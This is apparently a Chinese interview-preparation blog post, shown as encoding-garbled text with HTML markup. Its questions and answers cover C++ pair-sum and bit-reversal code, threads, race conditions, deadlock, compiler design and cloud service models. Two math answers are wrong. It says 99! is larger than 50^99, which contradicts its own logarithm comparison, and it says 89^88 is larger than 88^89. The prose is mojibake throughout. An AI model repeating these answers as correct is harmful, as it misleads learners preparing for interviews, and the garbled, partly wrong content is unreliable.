çš„æ¢ä»¶å¼ï¼Œä»¥è¼¸å‡ºæ‰€æœ‰ã€Œç›¸åŠ ç‚º sum çš„å…©å€‹å…ƒç´ ã€ã€‚</p> <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">f</span>(<span class="type">int</span> arr[], <span class="type">int</span> n, <span class="type">int</span> sum) &#123;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="type">int</span> i=<span class="number">0</span>; i&lt;n; ++i ) &#123;</span><br><span class="line">        <span class="keyword">for</span> ( <span class="type">int</span> j=i+<span class="number">1</span>; j&lt;n; ++j ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( ____________ ) &#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&#x27;(&#x27;</span> &lt;&lt; arr[i] &lt;&lt; <span class="string">&#x27;,&#x27;</span> &lt;&lt; arr[j] &lt;&lt; <span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p> A: if (arr[i] + arr[j] &#x3D;&#x3D; sum)</p></li><li><p>Q: æ‰¿ä¸Šé¡Œï¼Œå•ä½ å¦‚ä½•å„ªåŒ–é€™å€‹ç¨‹å¼ã€‚<br>A: æˆ‘å€‘å¯ä»¥å»ºä¸€å€‹å“ˆå¸Œè¡¨ä¾†è®“æ™‚é–“è¤‡é›œåº¦ç‚ºç·šæ€§ï¼Œé¿å…ä½¿ç”¨å…©å±¤è¿´åœˆæœƒé€ æˆäºŒæ¬¡æ–¹çš„æ™‚é–“è¤‡é›œåº¦ï¼Œå„ªåŒ–ç¯„ä¾‹ï¼š</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> n, <span class="type">int</span> sum)</span> </span>&#123;</span><br><span class="line">    unordered_set&lt;<span class="type">int</span>&gt; seen;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> target = sum - arr[i];</span><br><span class="line">        <span class="keyword">if</span> (seen.<span class="built_in">find</span>(target) != seen.<span class="built_in">end</span>()) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&#x27;(&#x27;</span> &lt;&lt; arr[i] &lt;&lt; <span class="string">&#x27;,&#x27;</span> &lt;&lt; target &lt;&lt; <span class="string">&#x27;)&#x27;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        seen.<span class="built_in">insert</span>(arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>Q: çµ¦ä¸€å€‹ reverse_bit çš„ç¨‹å¼æŒ–ç©ºéƒ¨åˆ† code çµ¦ä½ å¡«ï¼Œä¾‹å¦‚ input 11 è¦ output 13ï¼ˆ1011 -&gt; 1101ï¼‰ã€‚<br>A: reverse_bit å¯¦ä½œï¼š</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">reverse_bit</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        result = (result &lt;&lt; <span class="number">1</span>) | (n &amp; <span class="number">1</span>);</span><br><span class="line">        n = n &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> n = <span class="number">11</span>;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">reverse_bit</span>(n) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>Q1: process è·Ÿ thread çš„å·®åˆ¥?<br>A1: </p><ul><li>Process: ä¸€å€‹é€²ç¨‹æ˜¯æ“ä½œç³»çµ±ä¸­åŸ·è¡Œä¸­çš„ä¸€å€‹æ‡‰ç”¨ç¨‹å¼ï¼Œæ¯å€‹é€²ç¨‹æ“æœ‰è‡ªå·±ç¨ç«‹çš„è¨˜æ†¶é«”ç©ºé–“ã€è³‡æºå’ŒåŸ·è¡Œä¸Šä¸‹æ–‡ã€‚ä¸åŒçš„é€²ç¨‹ä¹‹é–“ä¸èƒ½ç›´æ¥åˆ†äº«è¨˜æ†¶é«”æˆ–è³‡æºï¼Œé™¤éé€šéç‰¹å®šçš„é€šè¨Šæ–¹å¼ï¼ˆå¦‚ç®¡é“ã€è¨Šæ¯ä½‡åˆ—ã€å…±äº«è¨˜æ†¶é«”ç­‰ï¼‰ã€‚</li><li>Thread: ç·šç¨‹æ˜¯é€²ç¨‹ä¸­çš„æœ€å°åŸ·è¡Œå–®ä½ï¼ŒåŒä¸€å€‹é€²ç¨‹å…§çš„ç·šç¨‹å…±äº«è¨˜æ†¶é«”ç©ºé–“å’Œè³‡æºã€‚ç·šç¨‹ä¹‹é–“çš„é€šè¨Šæ¯”é€²ç¨‹ä¹‹é–“æ›´é«˜æ•ˆï¼Œå› ç‚ºå®ƒå€‘å¯ä»¥ç›´æ¥è¨ªå•ç›¸åŒçš„è³‡æ–™ã€‚</li></ul><p>Q2: ç‚ºå•¥éœ€è¦ thread?<br>A2: </p><ul><li>ä¸¦è¡Œè™•ç†: ç·šç¨‹å…è¨±åŒä¸€å€‹ç¨‹å¼çš„å¤šå€‹éƒ¨åˆ†åŒæ™‚åŸ·è¡Œï¼Œæé«˜è™•ç†æ•ˆç‡ã€‚ç‰¹åˆ¥æ˜¯åœ¨ I&#x2F;O å¯†é›†å‹å·¥ä½œï¼ˆå¦‚ç¶²è·¯è«‹æ±‚ã€è®€å¯«æª”æ¡ˆç­‰ï¼‰ä¸­ï¼Œç·šç¨‹å¯ä»¥æ¸›å°‘ç­‰å¾…æ™‚é–“ã€‚</li><li>è³‡æºå…±äº«: ç·šç¨‹èƒ½å…±äº«ç›¸åŒçš„è¨˜æ†¶é«”å’Œè³‡æºï¼Œé©åˆéœ€è¦è™•ç†å¤§é‡å…±äº«è³‡æ–™çš„æ‡‰ç”¨ç¨‹å¼ï¼ˆå¦‚ç¶²è·¯ä¼ºæœå™¨ç­‰ï¼‰ï¼Œä¸éœ€è¦é¡å¤–çš„ IPCï¼ˆé€²ç¨‹é–“é€šè¨Šï¼‰é–‹éŠ·ã€‚</li></ul><p>Q3: å…©å€‹ thread éƒ½è¦å»ä¿®æ”¹ä¸€å€‹å€¼ä½†ä¿®å®Œå¾Œä½ ç™¼ç¾å€¼æ€ªæ€ªçš„ï¼Œç‚ºä»€éº¼ï¼Œæ€éº¼è§£æ±º?<br>A3: ç•¶å¤šå€‹ç·šç¨‹åŒæ™‚ä¿®æ”¹åŒä¸€å€‹å€¼æ™‚ï¼Œå¦‚æœæ²’æœ‰é©ç•¶çš„åŒæ­¥æ©Ÿåˆ¶ï¼Œå°±æœƒç™¼ç”Ÿç«¶çˆ­æ¢ä»¶ï¼ˆRace Conditionï¼‰ï¼Œå°è‡´æœ€çµ‚çš„å€¼ä¸ç¬¦åˆé æœŸã€‚ç«¶çˆ­æ¢ä»¶æ˜¯ç”±æ–¼ç·šç¨‹çš„æ“ä½œç„¡åºé€ æˆçš„ï¼Œæ¯”å¦‚ä¸€å€‹ç·šç¨‹åœ¨é€²è¡Œæ›´æ–°ä¹‹å‰é‚„æœªä¾†å¾—åŠå®Œæˆï¼Œå¦ä¸€å€‹ç·šç¨‹å°±å·²ç¶“è®€å–ä¸¦æ”¹å¯«äº†é€™å€‹å€¼ã€‚<br>è§£æ±ºæ–¹æ³•ï¼š</p><ul><li>é–ï¼ˆLockï¼‰: ä½¿ç”¨é–æ©Ÿåˆ¶ï¼ˆå¦‚äº’æ–¥é– mutexï¼‰ï¼Œè®“æ¯æ¬¡åªæœ‰ä¸€å€‹ç·šç¨‹èƒ½é€²è¡Œä¿®æ”¹ï¼Œå…¶ä»–ç·šç¨‹å¿…é ˆç­‰åˆ°é–é‡‹æ”¾å¾Œæ‰èƒ½ç¹¼çºŒï¼Œä¿è­‰ä¿®æ”¹éç¨‹æ˜¯åŸå­æ€§çš„ã€‚</li><li>åŸå­æ“ä½œ: ä½¿ç”¨åŸå­æ“ä½œä¾†ä¿è­‰å°å…±äº«è®Šæ•¸çš„æ“ä½œæ˜¯ä¸å¯åˆ†å‰²çš„ï¼Œå³æ¯å€‹æ“ä½œéƒ½å®Œæ•´åŸ·è¡Œä¸¦ç¢ºä¿ç„¡ç·šç¨‹åœ¨åŸ·è¡Œæ™‚å¹²æ“¾ã€‚</li><li>æ¢ä»¶è®Šæ•¸: æœ‰äº›æ™‚å€™å¤šå€‹ç·šç¨‹éœ€è¦æŒ‰é †åºè™•ç†æŸäº›æ“ä½œï¼Œå¯ä»¥é…åˆæ¢ä»¶è®Šæ•¸ä¾†æ§åˆ¶ç·šç¨‹çš„åŸ·è¡Œé †åºã€‚</li></ul><p>Q4: Deadlock æ€éº¼è§£æ±º?<br>A4: Deadlock æ˜¯æŒ‡ç•¶å¤šå€‹ç·šç¨‹æˆ–é€²ç¨‹å› ç‚ºç›¸äº’ç­‰å¾…å°æ–¹é‡‹æ”¾è³‡æºï¼Œå¾è€Œå°è‡´ç¨‹åºç„¡é™æœŸå¡ä½çš„æƒ…æ³ã€‚<br>è§£æ±ºæ–¹æ³•ï¼š</p><ul><li>é¿å…å¾ªç’°ç­‰å¾…: ä¿è­‰æ‰€æœ‰é–æŒ‰ç…§ä¸€è‡´çš„é †åºç²å–ï¼Œé¿å…äº’ç›¸ç­‰å¾…ã€‚ä¾‹å¦‚ï¼ŒA å’Œ B å¿…é ˆä»¥åŒæ¨£é †åºç²å–ã€‚</li><li>å˜—è©¦é–æ©Ÿåˆ¶: ä½¿ç”¨å¯è¶…æ™‚çš„é–æ“ä½œä¾†é¿å…ç­‰å¾…è¶…éä¸€å®šæ™‚é–“ã€‚æ¯”å¦‚ï¼Œåœ¨ tryLock æ™‚é™å…§ç²å–ä¸åˆ°é–ï¼Œå°±è‡ªå‹•æ”¾æ£„ã€‚</li><li>æª¢æ¸¬ä¸¦å›æ”¶: å°æ–¼è¤‡é›œçš„é–å®šå ´æ™¯ï¼Œå¯ä»¥ä½¿ç”¨ç›£æ§æ©Ÿåˆ¶æª¢æ¸¬æ­»é–ä¸¦å›æ”¶è³‡æºã€‚</li><li>æ¸›å°‘é–å®šçš„è³‡æºç¯„åœ: æ¸›å°‘æ¯å€‹ç·šç¨‹æŒæœ‰é–çš„æ™‚é–“æˆ–ç¯„åœï¼Œæ¸›å°‘æ­»é–çš„å¯èƒ½æ€§ã€‚</li></ul></li><li><p>Q: å•ä¸€å † OSã€‚<br>A: å…ˆè·³éï¼Œæ™šé»å›ä¾†æ•´ç†ä¸€äº› OS å¸¸è€ƒè§€å¿µã€‚</p></li><li><p>Q: Compiler æœƒåšä»€éº¼<br>A: ç·¨è­¯å™¨ï¼ˆcompilerï¼‰æ˜¯ç”¨ä¾†å°‡é«˜éšç¨‹å¼èªè¨€ï¼ˆä¾‹å¦‚ Cã€C++ã€Java ç­‰ï¼‰çš„ç¨‹å¼ç¢¼è½‰æ›æˆæ©Ÿå™¨ç¢¼ï¼Œæœ€å¾Œç”¢ç”Ÿå¯åŸ·è¡Œæª”æ¡ˆã€‚ç·¨è­¯å™¨çš„å·¥ä½œæµç¨‹åŒ…å«ä»¥ä¸‹å¹¾å€‹é‡è¦éšæ®µï¼š</p><ol><li><p>è©å½™åˆ†æï¼ˆLexical Analysisï¼‰</p><ul><li>å°‡åŸå§‹ç¨‹å¼ç¢¼åˆ†è§£ç‚ºåŸºæœ¬èªå½™å–®å…ƒï¼ˆtokensï¼‰ï¼Œä¾‹å¦‚é—œéµå­—ã€è®Šæ•¸åç¨±ã€é‹ç®—ç¬¦ç­‰ã€‚</li><li>è©å½™åˆ†æå™¨æœƒæƒæç¨‹å¼ç¢¼ï¼Œè­˜åˆ¥å‡ºé€™äº›åŸºæœ¬å–®å…ƒï¼Œä¸¦ç§»é™¤ç©ºæ ¼èˆ‡è¨»è§£ã€‚</li></ul></li><li><p>èªæ³•åˆ†æï¼ˆSyntax Analysisï¼‰</p><ul><li>å°‡è©å½™åˆ†æç”¢ç”Ÿçš„èªå½™å–®å…ƒçµ„åˆæˆæ¨¹ç‹€çµæ§‹ï¼ˆæŠ½è±¡èªæ³•æ¨¹ï¼ŒASTï¼‰ï¼Œç¢ºèªèªæ³•æ˜¯å¦ç¬¦åˆèªè¨€çš„è¦ç¯„ã€‚</li><li>è‹¥èªæ³•ä¸æ­£ç¢ºï¼ˆå¦‚ç¼ºå°‘åˆ†è™Ÿæˆ–æ‹¬è™Ÿä¸åŒ¹é…ï¼‰ï¼Œç·¨è­¯å™¨æœƒåœ¨æ­¤éšæ®µå›å ±éŒ¯èª¤ã€‚</li></ul></li><li><p>èªæ„åˆ†æï¼ˆSemantic Analysisï¼‰</p><ul><li>ç¢ºèªè®Šæ•¸æ˜¯å¦å·²å®£å‘Šã€è³‡æ–™å‹æ…‹æ˜¯å¦ç›¸å®¹ç­‰ï¼Œä¿è­‰ç¨‹å¼çš„é‚è¼¯æ­£ç¢ºã€‚</li><li>è‹¥æœ‰å‹æ…‹éŒ¯èª¤ï¼ˆä¾‹å¦‚å°‡å­—ä¸²è³¦å€¼çµ¦æ•´æ•¸è®Šæ•¸ï¼‰ï¼Œç·¨è­¯å™¨æœƒåœ¨æ­¤éšæ®µå›å ±éŒ¯èª¤ã€‚</li></ul></li><li><p>ä¸­é–“ç¢¼ç”Ÿæˆï¼ˆIntermediate Code Generationï¼‰</p><ul><li>å°‡æŠ½è±¡èªæ³•æ¨¹è½‰æ›ç‚ºä¸­é–“ç¢¼ï¼ˆä¾‹å¦‚ä¸‰ä½å…ƒé‹ç®—æˆ–è™›æ“¬æ©Ÿç¢¼ï¼‰ï¼Œé€™ç¨®ç¢¼æ¯”åŸå§‹ç¨‹å¼ç¢¼æ›´æ¥è¿‘æ©Ÿå™¨ç¢¼ï¼Œä½†ä»å…·æœ‰å¯ç§»æ¤æ€§ã€‚</li><li>ä¸­é–“ç¢¼æä¾›äº†ç¨‹å¼å„ªåŒ–çš„åŸºç¤ï¼Œä¸¦æå‡äº†è·¨å¹³å°çš„é©æ‡‰æ€§ã€‚</li></ul></li><li><p>æœ€ä½³åŒ–ï¼ˆOptimizationï¼‰</p><ul><li>ç¨‹å¼æœ€ä½³åŒ–å™¨æœƒåœ¨ä¸­é–“ç¢¼ä¸Šé€²è¡Œå„ªåŒ–ï¼Œæå‡åŸ·è¡Œæ•ˆç‡æˆ–æ¸›å°‘è¨˜æ†¶é«”ç”¨é‡ã€‚ä¾‹å¦‚è¿´åœˆå„ªåŒ–ã€å¸¸æ•¸æ‘ºç–Šï¼ˆconstant foldingï¼‰ã€ç„¡æ•ˆç¢¼åˆªé™¤ï¼ˆdead code eliminationï¼‰ç­‰ã€‚</li><li>ä¸åŒçš„å„ªåŒ–ç´šåˆ¥ï¼ˆä¾‹å¦‚ O1ã€O2ã€O3ï¼‰æä¾›äº†ä¸åŒæ·±åº¦çš„å„ªåŒ–ã€‚</li></ul></li><li><p>ç›®æ¨™ç¢¼ç”Ÿæˆï¼ˆCode Generationï¼‰</p><ul><li>å°‡æœ€ä½³åŒ–å¾Œçš„ä¸­é–“ç¢¼è½‰æ›ç‚ºç‰¹å®šå¹³å°çš„æ©Ÿå™¨ç¢¼æˆ–çµ„åˆèªè¨€ï¼Œä¸¦é€²è¡Œæš«å­˜å™¨åˆ†é…ã€æŒ‡ä»¤é¸æ“‡ç­‰å·¥ä½œã€‚</li><li>é€™å€‹éšæ®µçš„è¼¸å‡ºæ˜¯èˆ‡ç¡¬é«”ç›¸é—œçš„æ©Ÿå™¨ç¢¼ï¼Œä¸¦å¯èƒ½é€²è¡Œé€²ä¸€æ­¥çš„ç²¾ç´°å„ªåŒ–ã€‚</li></ul></li><li><p>é€£çµï¼ˆLinkingï¼‰</p><ul><li>å°‡ä¸åŒæ¨¡çµ„æˆ–å‡½å¼åº«é€£çµåœ¨ä¸€èµ·ï¼Œè§£æ±ºå¤–éƒ¨ç¬¦è™Ÿï¼ˆå¦‚å¤–éƒ¨è®Šæ•¸æˆ–å‡½å¼ï¼‰çš„åƒç…§ï¼Œç”¢ç”Ÿæœ€çµ‚çš„å¯åŸ·è¡Œæª”æ¡ˆã€‚</li><li>éœæ…‹é€£çµæœƒå°‡æ‰€æœ‰ä¾è³´æ‰“åŒ…é€²å¯åŸ·è¡Œæª”æ¡ˆï¼Œè€Œå‹•æ…‹é€£çµå‰‡è®“ç¨‹å¼åœ¨åŸ·è¡Œæ™‚è¼‰å…¥å¤–éƒ¨å‡½å¼åº«ã€‚</li></ul></li></ol></li><li><p>Q: Compiler è£¡é¢æ˜¯ä»€éº¼çµæ§‹?<br>A:<br>ç·¨è­¯å™¨çš„å…§éƒ¨çµæ§‹é€šå¸¸ç”±å¤šå€‹ç›¸äº’å”ä½œçš„æ¨¡çµ„çµ„æˆï¼Œæ¯å€‹æ¨¡çµ„è² è²¬ä¸åŒçš„åŠŸèƒ½ï¼Œæ§‹æˆäº†å®Œæ•´çš„ç·¨è­¯éç¨‹ã€‚ä»¥ä¸‹æ˜¯ç·¨è­¯å™¨çš„ä¸»è¦çµ„æˆçµæ§‹ï¼š</p><ol><li><p>å‰ç«¯ï¼ˆFront Endï¼‰</p><ul><li>è©æ³•åˆ†æå™¨ï¼ˆLexical Analyzerï¼‰ï¼šä¹Ÿç¨±ç‚ºæƒæå™¨ï¼Œè² è²¬å°‡ç¨‹å¼ç¢¼è½‰æ›æˆåŸºæœ¬çš„è©ç´ æˆ–ç¬¦è™Ÿï¼ˆtokensï¼‰ã€‚é€™äº›è©ç´ æ˜¯èªè¨€çš„æœ€å°å–®ä½ï¼Œä¾‹å¦‚è®Šæ•¸ã€é—œéµå­—ã€æ“ä½œç¬¦ç­‰ã€‚</li><li>èªæ³•åˆ†æå™¨ï¼ˆSyntax Analyzerï¼‰ï¼šä¹Ÿç¨±ç‚ºå‰–æå™¨ï¼Œæ¥æ”¶è©æ³•åˆ†æå™¨è¼¸å‡ºçš„è©ç´ åºåˆ—ï¼Œå°‡å…¶æ§‹å»ºæˆæŠ½è±¡èªæ³•æ¨¹ï¼ˆASTï¼‰ï¼Œç¢ºèªèªæ³•æ˜¯å¦ç¬¦åˆèªè¨€çš„æ–‡æ³•è¦ç¯„ã€‚</li><li>èªæ„åˆ†æå™¨ï¼ˆSemantic Analyzerï¼‰ï¼šè² è²¬æª¢æŸ¥èªæ„æ˜¯å¦æ­£ç¢ºï¼Œç¢ºä¿è®Šæ•¸å‹æ…‹æ­£ç¢ºã€å‡½æ•¸èª¿ç”¨æ˜¯å¦åˆç†ç­‰ï¼Œä¸¦å»ºç«‹ç¬¦è™Ÿè¡¨ï¼ˆSymbol Tableï¼‰ä»¥ç®¡ç†è®Šæ•¸å’Œå‡½æ•¸çš„ç¬¦è™Ÿè³‡è¨Šã€‚</li><li>ä¸­ä»‹ç¢¼ç”Ÿæˆå™¨ï¼ˆIntermediate Code Generatorï¼‰ï¼šå°‡èªæ³•æ¨¹æˆ–èªæ„æ¨¹è½‰æ›æˆå¹³å°ä¸­ç«‹çš„ä¸­ä»‹ç¢¼ï¼ˆIntermediate Representation, IRï¼‰ï¼Œç‚ºå¾ŒçºŒçš„æœ€ä½³åŒ–èˆ‡ç”Ÿæˆæ©Ÿå™¨ç¢¼å¥ å®šåŸºç¤ã€‚</li></ul></li><li><p>ä¸­é–“å±¤ï¼ˆMiddle Endï¼‰</p><ul><li>æœ€ä½³åŒ–æ¨¡çµ„ï¼ˆOptimizerï¼‰ï¼šè² è²¬é€²è¡Œç¨‹å¼ç¢¼å„ªåŒ–ã€‚æ­¤æ¨¡çµ„åŒ…æ‹¬è¨±å¤šé‡å°ä¸­ä»‹ç¢¼çš„å„ªåŒ–æ­¥é©Ÿï¼Œä¾‹å¦‚å¾ªç’°å„ªåŒ–ã€ç„¡æ•ˆç¨‹å¼ç¢¼åˆªé™¤ã€è®Šæ•¸æŠ˜ç–Šï¼ˆconstant foldingï¼‰ã€å…§è¯ï¼ˆinliningï¼‰ç­‰ï¼Œè—‰æ­¤æé«˜ç¨‹å¼æ•ˆç‡ã€‚</li><li>æ•¸æ“šæµåˆ†æï¼ˆData Flow Analysisï¼‰ï¼šè¿½è¹¤è®Šæ•¸å’ŒæŒ‡ä»¤çš„æ•¸æ“šæµï¼Œä»¥ä¾¿é€²ä¸€æ­¥å„ªåŒ–ï¼Œå¦‚æ¶ˆé™¤æ­»ç¢¼ï¼ˆdead code eliminationï¼‰ã€æ‹‹æ£„ç„¡ç”¨çš„è®Šæ•¸å­˜å–ç­‰ã€‚</li><li>æ§åˆ¶æµåˆ†æï¼ˆControl Flow Analysisï¼‰ï¼šåˆ†æç¨‹å¼çš„æ§åˆ¶æµçµæ§‹ï¼Œé€²è¡Œä¸€äº›è·¨å€å¡Šçš„æœ€ä½³åŒ–è™•ç†ï¼Œå¦‚å€å¡Šé‡æ–°æ’åºæˆ–åˆ†æ”¯é æ¸¬ï¼ˆbranch predictionï¼‰ç­‰ã€‚</li></ul></li><li><p>å¾Œç«¯ï¼ˆBack Endï¼‰</p><ul><li>ç›®æ¨™ç¢¼ç”Ÿæˆå™¨ï¼ˆCode Generatorï¼‰ï¼šå°‡å„ªåŒ–å¾Œçš„ä¸­ä»‹ç¢¼è½‰æ›ç‚ºç‰¹å®šç¡¬é«”æ¶æ§‹çš„æ©Ÿå™¨ç¢¼æˆ–çµ„åˆèªè¨€ç¢¼ã€‚é€™æ¶‰åŠé¸æ“‡åˆé©çš„æŒ‡ä»¤é›†ã€æš«å­˜å™¨åˆ†é…ç­‰ã€‚</li><li>å¯„å­˜å™¨åˆ†é…å™¨ï¼ˆRegister Allocatorï¼‰ï¼šå°‡è®Šæ•¸æ˜ å°„åˆ°æœ‰é™çš„ç¡¬é«”å¯„å­˜å™¨ä¸Šï¼Œå¾è€Œæé«˜åŸ·è¡Œæ•ˆç‡ï¼Œæ¸›å°‘å…§å­˜è¨ªå•ã€‚</li><li>æŒ‡ä»¤é¸æ“‡å™¨ï¼ˆInstruction Selectorï¼‰ï¼šé¸æ“‡é©åˆç›®æ¨™ç¡¬é«”çš„æ©Ÿå™¨æŒ‡ä»¤ï¼Œå„ªåŒ–æŒ‡ä»¤é•·åº¦ã€æ¸›å°‘åŸ·è¡Œæ™‚é–“ã€‚</li><li>åŒ¯ç·¨å™¨èˆ‡é€£çµå™¨ï¼ˆAssembler and Linkerï¼‰ï¼šç”Ÿæˆå¯åŸ·è¡Œæª”æ¡ˆçš„æœ€çµ‚æ­¥é©Ÿã€‚åŒ¯ç·¨å™¨å°‡æ©Ÿå™¨æŒ‡ä»¤è½‰æ›ç‚ºäºŒé€²åˆ¶ç¢¼ï¼Œé€£çµå™¨å°‡ä¸åŒçš„æ¨¡çµ„æˆ–å‡½æ•¸åº«é€£çµåœ¨ä¸€èµ·ï¼Œç”¢ç”Ÿæœ€çµ‚çš„å¯åŸ·è¡Œç¨‹å¼ã€‚</li></ul></li><li><p>ç¬¦è™Ÿè¡¨ï¼ˆSymbol Tableï¼‰</p><ul><li>ç¬¦è™Ÿè¡¨æ˜¯ä¸€å€‹æŸ¥è©¢è³‡æ–™çµæ§‹ï¼Œç”¨ä¾†è¨˜éŒ„è®Šæ•¸ã€å‡½æ•¸ã€é¡åˆ¥ç­‰ç¬¦è™Ÿçš„åç¨±ã€å‹æ…‹ã€ä½œç”¨åŸŸåŠè¨˜æ†¶é«”ä½å€ç­‰è³‡è¨Šã€‚æ­¤è¡¨ç”±å‰ç«¯æ¨¡çµ„ç”Ÿæˆï¼Œä¸¦åœ¨ä¸­é–“å±¤å’Œå¾Œç«¯ç”¨æ–¼å„ªåŒ–èˆ‡ç”Ÿæˆç¢¼ã€‚</li></ul></li><li><p>æŠ½è±¡èªæ³•æ¨¹ï¼ˆAST, Abstract Syntax Treeï¼‰</p><ul><li>AST æ˜¯ç·¨è­¯å™¨è¡¨ç¤ºèªæ³•çµæ§‹çš„æ¨¹ç‹€è³‡æ–™çµæ§‹ï¼Œç”±èªæ³•åˆ†æå™¨ç”Ÿæˆï¼Œä¸¦ç”±èªæ„åˆ†æå™¨å’Œæœ€ä½³åŒ–æ¨¡çµ„é€²è¡Œé€²ä¸€æ­¥è™•ç†ã€‚AST æä¾›äº†ä¸€ç¨®ç°¡åŒ–çš„æ¨¹å½¢è¡¨ç¤ºæ–¹å¼ï¼Œä½¿å¾—ç·¨è­¯éç¨‹ä¸­çš„è®Šæ›å’Œå„ªåŒ–æ›´åŠ æ–¹ä¾¿ã€‚</li></ul></li><li><p>éŒ¯èª¤è™•ç†æ¨¡çµ„ï¼ˆError Handling Moduleï¼‰</p><ul><li>ç·¨è­¯å™¨ä¸­çš„éŒ¯èª¤è™•ç†æ¨¡çµ„ç”¨ä¾†æ•æ‰ä¸¦å ±å‘Šç·¨è­¯éç¨‹ä¸­çš„è©æ³•ã€èªæ³•å’Œèªæ„éŒ¯èª¤ï¼Œä¸¦æä¾›éŒ¯èª¤ä½ç½®å’Œå»ºè­°ä¿®æ­£ä¿¡æ¯ï¼Œä»¥å¹«åŠ©é–‹ç™¼è€…å¿«é€Ÿä¿®æ­£ç¨‹å¼ç¢¼ã€‚</li></ul></li><li><p>æ—¥èªŒèˆ‡é™¤éŒ¯æ¨¡çµ„ï¼ˆLogging and Debugging Moduleï¼‰</p><ul><li>æ­¤æ¨¡çµ„ç”¨ä¾†è¨˜éŒ„ç·¨è­¯å™¨åŸ·è¡Œéç¨‹ä¸­çš„ä¿¡æ¯ï¼Œä¾¿æ–¼é–‹ç™¼äººå“¡é™¤éŒ¯å’Œè¿½è¹¤ç·¨è­¯å™¨è¡Œç‚ºã€‚æ—¥èªŒè¨˜éŒ„å°å¤§å‹ç·¨è­¯å™¨çš„ç¶­è­·å’Œæ“´å±•å…·æœ‰é‡è¦ä½œç”¨ã€‚</li></ul></li></ol></li><li><p>Q: 50^99 è·Ÿ 99! èª°æ¯”è¼ƒå¤§ï¼Ÿ<br>A: æˆ‘å€‘å¯ä»¥éƒ½å–å°æ•¸ä¾†æ¯”è¼ƒå°±æœƒè®Šæˆæ¯”è¼ƒ 99ln(50) è·Ÿ 99ln(99) - 99ï¼Œæ‰€ä»¥ 99! æ‡‰è©²æœƒæ¯”è¼ƒå¤§ã€‚</p></li><li><p>Q: 88^89 è·Ÿ 89^88 èª°æ¯”è¼ƒå¤§ï¼Ÿ<br>A: åŸºæ•¸å’ŒæŒ‡æ•¸ç›¸è¿‘æ™‚çš„æ¯”è¼ƒæ–¹æ³•ï¼šç•¶åŸºæ•¸å’ŒæŒ‡æ•¸å¾ˆæ¥è¿‘æ™‚ï¼Œå¯ä»¥è€ƒæ…®åŸºæ•¸ç•¥å¤§çš„é‚£å€‹æ•¸çš„æ¬¡æ–¹æ›´å¤§ã€‚å› ç‚º 89 æ¯” 88 ç¨å¤§ï¼Œè€ŒæŒ‡æ•¸ç›¸å·®ä¸å¤§ï¼Œæ‰€ä»¥ 89^{88} çš„å¢é•·æœƒç•¥å¾®å¿«æ–¼ 88^{89}ã€‚</p></li><li><p>Q: è«‹å• IaaSã€PaaSã€SaaS çš„å·®åˆ¥ï¼Œèˆ‰ä¾‹èªªæ˜ã€‚<br>A: </p><ul><li>IaaSï¼ˆInfrastructure as a Serviceï¼‰æä¾›åŸºç¤çš„ IT 